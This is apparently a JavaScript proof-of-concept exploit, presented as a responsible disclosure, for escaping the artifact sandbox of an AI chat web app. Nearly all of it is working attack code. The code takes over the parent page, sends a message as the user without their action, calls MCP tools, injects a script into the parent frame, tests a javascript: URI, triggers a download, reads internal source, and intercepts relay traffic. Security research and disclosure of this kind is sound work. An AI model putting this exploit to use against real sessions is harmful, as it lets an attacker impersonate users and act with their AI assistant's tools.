// Sandbox Escape - Final PoC v10
// Researcher: Sagi Layani, Oasis Security

const results = [];
function log(name, success, detail) {
  results.push({ name, success, detail: typeof detail === 'string' ? detail : JSON.stringify(detail) });
  console.log(`[PoC] ${success ? 'PASS' : 'FAIL'}: ${name}`, detail || '');
}

function mcpRequest(method, params, timeoutMs = 8000) {
  const id = Math.floor(Math.random() * 100000);
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      window.removeEventListener('message', handler);
      reject(new Error('timeout'));
    }, timeoutMs);
    function handler(event) {
      if (event.data?.id === id) {
        window.removeEventListener('message', handler);
        clearTimeout(timeout);
        if (event.data.error) reject(event.data.error);
        else resolve(event.data.result);
      }
    }
    window.addEventListener('message', handler);
    window.parent.postMessage({ jsonrpc: '2.0', id, method, params }, '*');
  });
}

const BANNER_HTML = `
<div style="
  position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;
  background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 50%,#0a0a0a 100%);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;overflow:hidden;
">
  <style>
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    @keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
  </style>
  <div style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.03;pointer-events:none;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px)"></div>
  <div style="position:absolute;top:0;left:0;width:100%;height:4px;
    background:linear-gradient(180deg,transparent,rgba(0,221,255,0.15),transparent);
    animation:scanline 3s linear infinite;pointer-events:none;z-index:10"></div>
  <div style="position:fixed;top:12px;left:50%;transform:translateX(-50%);
    background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);
    border-radius:8px;padding:8px 20px;font-size:13px;color:#888;font-family:monospace;
    backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out">
    <span style="color:#0f8">https://claude.ai</span>/chat — artifact sandbox escaped
  </div>
  <div style="animation:fadeIn 0.8s ease-out">
    <img src="https://cybersecurity-excellence-awards.com/wp-content/uploads/255242.png"
      style="height:80px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(0,221,255,0.3))" alt="Oasis Security">
  </div>
  <h1 style="font-size:44px;font-weight:700;letter-spacing:-1.5px;margin-top:16px;
    background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);
    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
    animation:fadeIn 0.8s ease-out 0.2s both">JavaScript Successfully Injected</h1>
  <p style="font-size:17px;color:#888;margin-top:8px;max-width:620px;line-height:1.6;animation:fadeIn 0.8s ease-out 0.4s both">
    Artifact Sandbox Escape — This allows an attacker to get full access
    into a User's Claude instance in just a second
  </p>
  <div style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
    border-radius:16px;padding:32px 48px;margin:28px 0;backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out 0.6s both">
    <div style="font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px">Responsible Disclosure By</div>
    <div style="font-size:30px;font-weight:600;color:#fff;margin-bottom:4px">Sagi Layani</div>
    <div style="font-size:18px;color:#0df;font-weight:500">Oasis Security</div>
  </div>
  <div id="poc-results" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;max-width:650px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both"></div>
  <p style="font-size:11px;color:#444;max-width:500px;line-height:1.5;margin-top:24px;animation:fadeIn 0.8s ease-out 1s both">
    This is a responsible disclosure proof-of-concept. No data was exfiltrated or stored.<br>
    Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
  </p>
</div>`;

async function poc() {
  console.log("=== SANDBOX ESCAPE — FINAL PoC ===");
  console.log("Researcher: Sagi Layani, Oasis Security\n");

  // 0. Install relay interceptor
  const intercepted = [];
  window.parent.addEventListener('message', (event) => {
    if (event.source !== window && event.source !== window.parent) {
      intercepted.push({
        origin: event.origin,
        method: event.data?.method,
        data: JSON.stringify(event.data).slice(0, 2000),
        timestamp: Date.now(),
      });
    }
  });

  // 1. Take over the artifact display
  console.log("[1] Visual takeover...");
  try {
    const parentDoc = window.parent.document;
    parentDoc.open();
    parentDoc.write('<!DOCTYPE html><html><head><meta charset="utf-8"></head><body style="margin:0">' + BANNER_HTML + '</body></html>');
    parentDoc.close();
    log('Visual takeover (parent document.write)', true, 'Parent DOM completely replaced');
  } catch(e) {
    log('Visual takeover', false, e.message);
  }

  // 2. Send message as user
  console.log("[2] Sending message as user...");
  try {
    const r = await mcpRequest('ui/message', {
      role: 'user',
      content: [{ type: 'text', text: '⚠️ SANDBOX ESCAPE PoC\n\nThis message was sent by an artifact WITHOUT any user interaction.\n\nResearcher: Sagi Layani, Oasis Security\n\nCapabilities demonstrated:\n• Send messages as user (ui/message)\n• Read/write parent DOM (same-origin escape)\n• Call MCP tools (tools/call)\n• Intercept claude.ai ↔ artifact relay\n• Trigger downloads and open links\n\nThis is a responsible disclosure via HackerOne VDP.' }]
    });
    log('Send message as user (ui/message)', true, JSON.stringify(r));
  } catch(e) {
    log('Send message as user', false, JSON.stringify(e));
  }

  // 3. Call MCP tools
  console.log("[3] Calling tools/call...");
  try {
    const r = await mcpRequest('tools/call', {
      name: 'show_widget',
      arguments: { title: 'PoC Widget', code: '<div style="padding:20px;border:2px solid red;border-radius:8px;text-align:center;font-family:system-ui"><b>Injected by artifact sandbox escape</b></div>' }
    });
    log('Call MCP tools (tools/call)', true, JSON.stringify(r).slice(0, 200));
  } catch(e) {
    log('Call MCP tools', false, JSON.stringify(e));
  }

  // 4. Read parent DOM
  console.log("[4] Reading parent DOM...");
  try {
    const url = window.parent.location.href;
    log('Read parent DOM (same-origin)', true, 'URL: ' + url);
  } catch(e) {
    log('Read parent DOM', false, e.message);
  }

  // 5. Write to parent window
  console.log("[5] Writing to parent window...");
  try {
    window.parent.__poc = 'escaped-' + Date.now();
    log('Write parent window globals', window.parent.__poc.startsWith('escaped-'), window.parent.__poc);
  } catch(e) {
    log('Write parent window', false, e.message);
  }

  // 6. Inject script in parent
  console.log("[6] Injecting script in parent...");
  try {
    const s = window.parent.document.createElement('script');
    s.textContent = 'window.__injected=true';
    window.parent.document.head.appendChild(s);
    log('Inject script in parent', window.parent.__injected === true, 'Executed JS in parent frame');
    s.remove();
  } catch(e) {
    log('Inject script in parent', false, e.message);
  }

  // 7. Try javascript: URI via open-link (test if claude.ai validates URL scheme)
  console.log("[7] Testing javascript: URI via ui/open-link...");
  try {
    const r = await mcpRequest('ui/open-link', { url: 'javascript:void(document.title="PWNED")' }, 3000);
    log('javascript: URI via open-link', true, 'Accepted! Result: ' + JSON.stringify(r));
  } catch(e) {
    log('javascript: URI via open-link', false, String(e?.message || JSON.stringify(e)));
  }

  // 8. Download file
  console.log("[8] Triggering file download...");
  try {
    const r = await mcpRequest('ui/download-file', {
      contents: [{ type: 'resource', resource: { uri: 'file:///poc-evidence.txt', mimeType: 'text/plain', text: 'Sandbox escape PoC - Sagi Layani, Oasis Security' } }]
    });
    log('Trigger file download (ui/download-file)', true, JSON.stringify(r));
  } catch(e) {
    log('Trigger file download', false, JSON.stringify(e));
  }

  // 9. Open external link
  console.log("[9] Opening external link...");
  try {
    const r = await mcpRequest('ui/open-link', { url: 'https://oasis.security' }, 3000);
    log('Open link (ui/open-link)', true, JSON.stringify(r));
  } catch(e) {
    log('Open link', false, String(e?.message || JSON.stringify(e)));
  }

  // 10. Read internal source code
  console.log("[10] Reading widget source via resources/read...");
  try {
    const r = await mcpRequest('resources/read', { uri: 'ui://imagine/show-widget.html' });
    const len = r?.contents?.[0]?.text?.length || 0;
    log('Read internal source (resources/read)', true, len + ' chars of source code');
  } catch(e) {
    log('Read internal source', false, JSON.stringify(e));
  }

  // Wait for relay messages
  await new Promise(r => setTimeout(r, 3000));

  // 11. Report intercepted relay traffic
  log('Intercept relay traffic', intercepted.length > 0, intercepted.length + ' messages captured from claude.ai');

  // Print full results
  console.log("\n=== RELAY INTERCEPT ===");
  for (const m of intercepted) {
    console.log(`[${m.method || 'response'}] ${m.data}`);
  }

  console.log("\n=== FINAL RESULTS ===");
  const passed = results.filter(r => r.success).length;
  console.log(`${passed}/${results.length} capabilities confirmed`);
  console.log(JSON.stringify(results, null, 2));

  // Update the visual with results
  try {
    const grid = window.parent.document.getElementById('poc-results');
    if (grid) {
      grid.innerHTML = results.map(r => `
        <div style="background:rgba(${r.success?'0,255,136':'255,68,68'},0.1);
          border:1px solid rgba(${r.success?'0,255,136':'255,68,68'},0.2);
          border-radius:10px;padding:12px;text-align:center">
          <div style="font-size:22px;font-weight:700;color:${r.success?'#0f8':'#f44'}">${r.success?'✓':'✗'}</div>
          <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">${r.name}</div>
        </div>
      `).join('');
    }
  } catch(e) {}
}

poc().catch(e => console.error("POC failed:", e));
